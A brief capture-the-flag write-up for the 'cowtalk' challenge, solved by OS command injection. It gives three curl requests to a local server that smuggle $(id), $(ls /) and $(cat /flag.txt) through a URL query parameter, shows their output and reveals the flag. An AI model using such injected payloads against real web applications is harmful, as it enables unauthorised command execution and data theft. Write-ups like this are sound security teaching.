# Writeup for cowtalk challenge

## Solve

this is an os injection attack

```sh
$ curl http://localhost:1337/?text=%24%28id%29 # $(id)
...
<code>
uid=1001(www) gid=1001(www) groups=1001(www)

<code>
```

```sh
$ curl http://localhost:1337/?text=%24%28ls+%2F%29 # $(ls /)
...
<code>
app
bin
boot
dev
etc
flag.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
<code>
...
```

```sh
$ curl http://localhost:1337/?text=%24%28cat+%2Fflag.txt%29 # $(cat /flag.txt)
<code>
MOTORI{D0N7_Pr0Ud_0F_Y0uR_53lF_y0u_17'5_4N_0ld_vuln}
<code>
```